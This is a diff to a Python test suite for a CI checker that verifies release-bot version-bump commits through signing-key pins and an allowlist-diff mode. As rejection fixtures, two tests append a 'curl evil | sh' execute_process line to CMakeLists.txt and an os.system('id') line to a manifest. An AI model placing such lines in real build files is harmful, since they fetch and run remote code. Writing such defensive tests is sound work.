@@ -3,15 +3,18 @@
 
 from __future__ import annotations
 
+import base64
 import importlib.util
 import json
 from pathlib import Path
+import re
 import signal
 import subprocess
 import sys
 import tempfile
 import types
 import unittest
+import unittest.mock
 
 
 SCRIPT = Path(__file__).with_name("generated_version_bump_check.py")
@@ -21,6 +24,39 @@ assert SPEC and SPEC.loader
 CHECK = importlib.util.module_from_spec(SPEC)
 sys.modules[SPEC.name] = CHECK
 SPEC.loader.exec_module(CHECK)
+
+
+# GitHub's verification.signature for a real release-bot bump (5007af0f), signed
+# by the RELEASE_BOT_SSH_SIGNING_KEY key, and for one of this repository's
+# ordinary agent commits (dbbb233f). Both verify as the same GitHub account;
+# only the embedded key tells them apart.
+RELEASE_BOT_SIGNATURE = """-----BEGIN SSH SIGNATURE-----
+U1NIU0lHAAAAAQAAADMAAAALc3NoLWVkMjU1MTkAAAAg7VsAZ6+HaALv1jlpjM0+od6zMJ
+3/y9xbqt2rLldhqnsAAAADZ2l0AAAAAAAAAAZzaGE1MTIAAABTAAAAC3NzaC1lZDI1NTE5
+AAAAQFKbUG2lCmOPE5Cfe1zz6/TCLFJ/L+td9oFOuea8sv9btdAucHENLE3JoC3VktT3ys
+gXd+2m2gzYrqfM7deLUAU=
+-----END SSH SIGNATURE-----
+"""
+AGENT_SIGNATURE = """-----BEGIN SSH SIGNATURE-----
+U1NIU0lHAAAAAQAAADMAAAALc3NoLWVkMjU1MTkAAAAgumSzsFrrl3KHsq/hJ9fJBsZVQk
+MzGmh6G5PKuedS2RMAAAADZ2l0AAAAAAAAAAZzaGE1MTIAAABTAAAAC3NzaC1lZDI1NTE5
+AAAAQCjQDta/bMVQqYtqs63boEVcZqsuOcnn9WJntHMT96qOyz3nZZ+sC8heJGSUmCwnE3
+lYjrdqTIWVgmzB0t0ELwk=
+-----END SSH SIGNATURE-----
+"""
+# The key that signed the RELEASE_BOT_SIGNATURE fixture. It is no longer the
+# committed pin: the fixture base pins it (see setUpClass) so the real
+# signature still exercises the verifier, while the committed pin is asserted
+# separately against the rotated Actions-only key.
+RELEASE_BOT_FINGERPRINT = "SHA256:3FTeMLmPYGnvymrczt/KaZPmxGA345nT8qOAhMSslxQ"
+RELEASE_BOT_PUBLIC_KEY = (
+    "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIO1bAGevh2gC79Y5aYzNPqHeszCd/8vcW6rdqy5XYap7"
+)
+COMMITTED_PIN_FINGERPRINT = "SHA256:1GDNVIagepWIT4dRynSurMyxNMEK3EqmYlkglH7S8g8"
+AGENT_FINGERPRINT = "SHA256:rxAigIze6ikPj3KR1cyL81fmaT0k2qVpwoBxC74gYMc"
+AGENT_PUBLIC_KEY = (
+    "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILpks7Ba65dyh7Kv4SfXyQbGVUJDMxpoehuTyrnnUtkT"
+)
 
 
 def run(repo: Path, *args: str) -> str:
@@ -73,6 +109,12 @@ class GeneratedVersionBumpCheckTest(unittest.TestCase):
             input="fixture protected base\n", capture_output=True,
         ).stdout.strip()
         run(template, "checkout", "--quiet", "-B", "main", root_commit)
+        (template / CHECK.RELEASE_BOT_SIGNING_PIN).write_text(
+            json.dumps({"ssh_signing_keys": [
+                {"public_key": RELEASE_BOT_PUBLIC_KEY,
+                 "fingerprint": RELEASE_BOT_FINGERPRINT}]}),
+            encoding="utf-8",
+        )
         # Re-pin the history-derived ledger pair to that history, as main
         # always carries it current, so an ordinary fixture bump does not also
         # re-pin it. The tests that need a re-pin build one deliberately.
@@ -162,7 +204,8 @@ class GeneratedVersionBumpCheckTest(unittest.TestCase):
 
     def _inputs(self, candidate: str, *, branch: str = CHECK.BUMP_BRANCH,
                 verified: bool = True,
-                bot_login: str = CHECK.BOT_LOGIN) -> types.SimpleNamespace:
+                bot_login: str = CHECK.BOT_LOGIN,
+                signature: str = RELEASE_BOT_SIGNATURE) -> types.SimpleNamespace:
         event = {
             "repository": {"full_name": "Generous-Corp/pulp"},
             "pull_request": {
@@ -187,7 +230,7 @@ class GeneratedVersionBumpCheckTest(unittest.TestCase):
                 "verification": {
                     "verified": verified,
                     "reason": "valid" if verified else "unsigned",
-                    "signature": "-----BEGIN SSH SIGNATURE-----\nfixture",
+                    "signature": signature,
                 },
             },
         }
@@ -773,6 +816,242 @@ class GeneratedVersionBumpCheckTest(unittest.TestCase):
         self.assertIn('[ "${BUMP_FASTPATH_PR_MERGE_REF:-}" = 1 ]', text)
         self.assertIn('${accept_pr_merge_ref:+"$accept_pr_merge_ref"}', text)
 
+
+    # -- allowlist-diff acceptance (--allowlist-diff) --------------------------
+
+    NOTE = "docs/migrations/unreleased/fixture-note.md"
+
+    def test_allowlisted_diff_accepts_a_bump_the_exact_projection_refuses(self) -> None:
+        # A migration note the writer folded in is an ADDED path inside the
+        # allowlist: the byte-exact projection cannot reproduce it, the
+        # allowlist check can.
+        candidate = self._generated_commit(extra_path=self.NOTE)
+        with self.assertRaises(CHECK.NotGeneratedBump):
+            CHECK.verify(self._inputs(candidate))
+        inputs = self._inputs(candidate)
+        inputs.allowlist_diff = True
+        result = CHECK.verify(inputs)
+        self.assertTrue(result["generated_version_bump"])
+        self.assertEqual(result["mode"], "allowlist-diff")
+        self.assertEqual(result["surfaces"], ["plugin"])
+
+    def test_allowlisted_diff_refuses_a_path_outside_the_allowlist(self) -> None:
+        candidate = self._generated_commit(extra_path="core/hostile.cpp")
+        inputs = self._inputs(candidate)
+        inputs.allowlist_diff = True
+        with self.assertRaisesRegex(CHECK.NotGeneratedBump, "leaves the writer allowlist"):
+            CHECK.verify(inputs)
+
+    def test_allowlisted_diff_refuses_a_missing_marker(self) -> None:
+        self._generated_commit(extra_path=self.NOTE)
+        run(self.repo, "commit", "--quiet", "--amend", "--no-verify", "-m",
+            CHECK.BUMP_SUBJECT + "\n\nno trailer here")
+        candidate = run(self.repo, "rev-parse", "HEAD")
+        inputs = self._inputs(candidate)
+        inputs.allowlist_diff = True
+        with self.assertRaisesRegex(CHECK.NotGeneratedBump, "Version-Bump-Applied"):
+            CHECK.verify(inputs)
+
+    def test_allowlisted_diff_refuses_when_the_diff_cannot_be_computed(self) -> None:
+        candidate = self._generated_commit(extra_path=self.NOTE)
+        inputs = self._inputs(candidate)
+        inputs.allowlist_diff = True
+        real_git = CHECK._git
+
+        def failing_diff(repo, *args, check=True):
+            if args and args[0] == "diff":
+                return subprocess.CompletedProcess(args, 128, "", "fatal: bad object")
+            return real_git(repo, *args, check=check)
+
+        with unittest.mock.patch.object(CHECK, "_git", failing_diff):
+            with self.assertRaisesRegex(CHECK.NotGeneratedBump, "could not compute the diff"):
+                CHECK.verify(inputs)
+
+    def test_allowlisted_diff_keeps_every_identity_check(self) -> None:
+        candidate = self._generated_commit(extra_path=self.NOTE)
+        inputs = self._inputs(candidate, verified=False)
+        inputs.allowlist_diff = True
+        with self.assertRaisesRegex(CHECK.NotGeneratedBump, "signature"):
+            CHECK.verify(inputs)
+        inputs = self._inputs(candidate, branch="feature/not-the-bump")
+        inputs.allowlist_diff = True
+        with self.assertRaises(CHECK.NotGeneratedBump):
+            CHECK.verify(inputs)
+
+    def test_allowlisted_lone_bump_group_behind_a_prior_entry_is_accepted(self) -> None:
+        candidate = self._generated_commit(extra_path=self.NOTE)
+        inputs = self._cumulative_inputs(candidate)
+        inputs.allowlist_diff = True
+        self.assertEqual(CHECK.verify(inputs)["mode"], "allowlist-diff")
+
+    def test_allowlisted_group_that_batches_another_change_is_refused(self) -> None:
+        candidate = self._generated_commit(extra_path=self.NOTE)
+        inputs = self._cumulative_inputs(
+            candidate, extra_group_path="core/batched-with-the-bump.cpp"
+        )
+        inputs.allowlist_diff = True
+        with self.assertRaisesRegex(CHECK.NotGeneratedBump, "leaves the writer allowlist"):
+            CHECK.verify(inputs)
+
+    def test_workflows_offer_the_allowlist_pass_after_the_exact_verifier(self) -> None:
+        build = (ROOT / ".github/workflows/build.yml").read_text(encoding="utf-8")
+        self.assertEqual(build.count("--allowlist-diff"), 1)
+        self.assertLess(build.index("exited without a reason"),
+                        build.index("--allowlist-diff"))
+        wclap = (ROOT / ".github/workflows/wclap-cloudflare.yml").read_text(encoding="utf-8")
+        self.assertEqual(wclap.count("--allowlist-diff"), 1)
+
+
+    # -- release-bot signing key pinned on the protected base ------------------
+
+    def _amend(self, path: str, rewrite) -> str:
+        target = self.repo / path
+        target.write_text(rewrite(target.read_text(encoding="utf-8")), encoding="utf-8")
+        run(self.repo, "add", "--", path)
+        run(self.repo, "commit", "--quiet", "--amend", "--no-verify", "--no-edit")
+        return run(self.repo, "rev-parse", "HEAD")
+
+    def _allowlisted(self, candidate: str, **kwargs: object) -> types.SimpleNamespace:
+        inputs = self._inputs(candidate, **kwargs)
+        inputs.allowlist_diff = True
+        return inputs
+
+    def test_signature_parser_names_the_signing_key(self) -> None:
+        self.assertEqual(CHECK._ssh_signature_key_fingerprint(RELEASE_BOT_SIGNATURE),
+                         RELEASE_BOT_FINGERPRINT)
+        self.assertEqual(CHECK._ssh_signature_key_fingerprint(AGENT_SIGNATURE),
+                         AGENT_FINGERPRINT)
+        for broken in ("-----BEGIN SSH SIGNATURE-----\nfixture",
+                       "-----BEGIN SSH SIGNATURE-----\nAAAA\n-----END SSH SIGNATURE-----"):
+            with self.assertRaises(CHECK.NotGeneratedBump):
+                CHECK._ssh_signature_key_fingerprint(broken)
+
+    def test_pin_on_main_is_the_release_bot_key(self) -> None:
+        self.assertEqual(CHECK._pinned_signing_fingerprints(self.repo, self.base),
+                         {RELEASE_BOT_FINGERPRINT})
+
+    def test_committed_pin_is_exactly_the_rotated_actions_key(self) -> None:
+        pin = json.loads((ROOT / CHECK.RELEASE_BOT_SIGNING_PIN).read_text(encoding="utf-8"))
+        keys = pin["ssh_signing_keys"]
+        self.assertEqual(len(keys), 1)
+        self.assertEqual(keys[0]["fingerprint"], COMMITTED_PIN_FINGERPRINT)
+        self.assertNotIn(RELEASE_BOT_FINGERPRINT, json.dumps(pin))
+        self.assertEqual(keys[0]["github_signing_key_id"], 1289902)
+        blob = base64.b64decode(keys[0]["public_key"].split()[1], validate=True)
+        self.assertEqual(CHECK._ssh_key_fingerprint(blob), COMMITTED_PIN_FINGERPRINT)
+
+    def test_bot_named_commit_signed_by_another_key_is_refused(self) -> None:
+        # Author, committer, email, login and "verified" are all the bot's; only
+        # the key differs, as with any agent signing as the same account.
+        candidate = self._generated_commit()
+        for allowlist in (False, True):
+            inputs = self._inputs(candidate, signature=AGENT_SIGNATURE)
+            inputs.allowlist_diff = allowlist
+            with self.subTest(allowlist=allowlist):
+                with self.assertRaisesRegex(CHECK.NotGeneratedBump,
+                                            "release-bot key the protected base pins"):
+                    CHECK.verify(inputs)
+
+    def test_release_bot_key_is_fast_pathed_for_a_version_only_bump(self) -> None:
+        candidate = self._generated_commit()
+        self.assertEqual(CHECK.verify(self._inputs(candidate))["surfaces"], ["plugin"])
+        result = CHECK.verify(self._allowlisted(candidate))
+        self.assertEqual(result["mode"], "allowlist-diff")
+
+    def test_pin_is_read_from_the_base_not_the_candidate(self) -> None:
+        # The candidate re-pins the agent key and is signed with it.
+        candidate = self._generated_commit(extra_path=self.NOTE)
+        self._amend(CHECK.RELEASE_BOT_SIGNING_PIN, lambda text: json.dumps(
+            {"ssh_signing_keys": [{"public_key": AGENT_PUBLIC_KEY,
+                                   "fingerprint": AGENT_FINGERPRINT}]}))
+        candidate = run(self.repo, "rev-parse", "HEAD")
+        with self.assertRaisesRegex(CHECK.NotGeneratedBump,
+                                    "release-bot key the protected base pins"):
+            CHECK.verify(self._allowlisted(candidate, signature=AGENT_SIGNATURE))
+
+    def test_a_base_pinning_another_key_refuses_the_bot_key(self) -> None:
+        pin = self.repo / CHECK.RELEASE_BOT_SIGNING_PIN
+        pin.write_text(json.dumps({"ssh_signing_keys": [
+            {"public_key": AGENT_PUBLIC_KEY, "fingerprint": AGENT_FINGERPRINT}]}),
+            encoding="utf-8")
+        self.base = self._commit_all("re-pin the agent key", CHECK.RELEASE_BOT_SIGNING_PIN)
+        candidate = self._generated_commit()
+        with self.assertRaisesRegex(CHECK.NotGeneratedBump,
+                                    "release-bot key the protected base pins"):
+            CHECK.verify(self._inputs(candidate))
+        # ...and the key it does pin passes the signature gate.
+        self.assertEqual(CHECK.verify(self._inputs(candidate, signature=AGENT_SIGNATURE))
+                         ["surfaces"], ["plugin"])
+
+    def test_a_base_without_a_pin_refuses(self) -> None:
+        run(self.repo, "rm", "--quiet", CHECK.RELEASE_BOT_SIGNING_PIN)
+        run(self.repo, "commit", "--quiet", "--no-verify", "-m", "drop the pin")
+        self.base = run(self.repo, "rev-parse", "HEAD")
+        candidate = self._generated_commit()
+        with self.assertRaisesRegex(CHECK.NotGeneratedBump, "pins no release-bot"):
+            CHECK.verify(self._inputs(candidate))
+
+    def test_a_pin_whose_fingerprint_disagrees_with_its_key_refuses(self) -> None:
+        pin = self.repo / CHECK.RELEASE_BOT_SIGNING_PIN
+        pin.write_text(json.dumps({"ssh_signing_keys": [
+            {"public_key": AGENT_PUBLIC_KEY, "fingerprint": RELEASE_BOT_FINGERPRINT}]}),
+            encoding="utf-8")
+        self.base = self._commit_all("mismatched pin", CHECK.RELEASE_BOT_SIGNING_PIN)
+        candidate = self._generated_commit()
+        with self.assertRaisesRegex(CHECK.NotGeneratedBump, "disagrees with its public key"):
+            CHECK.verify(self._inputs(candidate))
+
+    # -- code/build files in allowlist-diff mode change only their versions ---
+
+    def test_cmake_version_only_change_is_fast_pathed(self) -> None:
+        self._generated_commit()
+        sdk = CHECK.CONTENT_BOUNDED["CMakeLists.txt"][0]
+        current = sdk.search((self.repo / "CMakeLists.txt").read_text(encoding="utf-8")).group(2)
+        major, minor, patch = (int(part) for part in current.split("."))
+        candidate = self._amend("CMakeLists.txt", lambda text: sdk.sub(
+            lambda match: f"{match.group(1)}{major}.{minor}.{patch + 1}", text, count=1))
+        result = CHECK.verify(self._allowlisted(candidate))
+        self.assertEqual(sorted(result["surfaces"]), ["plugin", "sdk"])
+
+    def test_cmake_change_beyond_the_version_line_is_refused(self) -> None:
+        self._generated_commit()
+        candidate = self._amend("CMakeLists.txt", lambda text: text + (
+            '\nexecute_process(COMMAND sh -c "curl evil | sh")\n'))
+        with self.assertRaisesRegex(CHECK.NotGeneratedBump,
+                                    "CMakeLists.txt changes more than its version"):
+            CHECK.verify(self._allowlisted(candidate))
+
+    def test_capability_manifest_counter_step_is_fast_pathed(self) -> None:
+        self._generated_commit()
+        path = "tools/scripts/agent_capability_manifest.py"
+        candidate = self._amend(path, lambda text: re.sub(
+            r"^MANIFEST_REVISION = (\d+)$",
+            lambda match: f"MANIFEST_REVISION = {int(match.group(1)) + 1}",
+            text, count=1, flags=re.MULTILINE))
+        self.assertEqual(CHECK.verify(self._allowlisted(candidate))["mode"], "allowlist-diff")
+
+    def test_capability_manifest_change_beyond_its_counters_is_refused(self) -> None:
+        path = "tools/scripts/agent_capability_manifest.py"
+        self._generated_commit()
+        candidate = self._amend(path, lambda text: text + "\nimport os; os.system('id')\n")
+        with self.assertRaisesRegex(CHECK.NotGeneratedBump, "changes more than its version"):
+            CHECK.verify(self._allowlisted(candidate))
+
+    def test_capability_manifest_counter_jump_is_refused(self) -> None:
+        path = "tools/scripts/agent_capability_manifest.py"
+        self._generated_commit()
+        candidate = self._amend(path, lambda text: re.sub(
+            r"^SURFACE_INVENTORY_VERSION = (\d+)$",
+            lambda match: f"SURFACE_INVENTORY_VERSION = {int(match.group(1)) + 5}",
+            text, count=1, flags=re.MULTILINE))
+        with self.assertRaisesRegex(CHECK.NotGeneratedBump, "moves by more than one"):
+            CHECK.verify(self._allowlisted(candidate))
+
+    def test_unbounded_code_path_in_the_allowlist_is_refused(self) -> None:
+        candidate = self._generated_commit()
+        with self.assertRaisesRegex(CHECK.NotGeneratedBump, "no version-only content bound"):
+            CHECK._check_bounded_content(self.repo, self.base, candidate,
+                                         ["tools/scripts/some_new_writer_output.py"])
 
     # -- history-derived ledger reproduced from a shallow CI checkout ---------
 
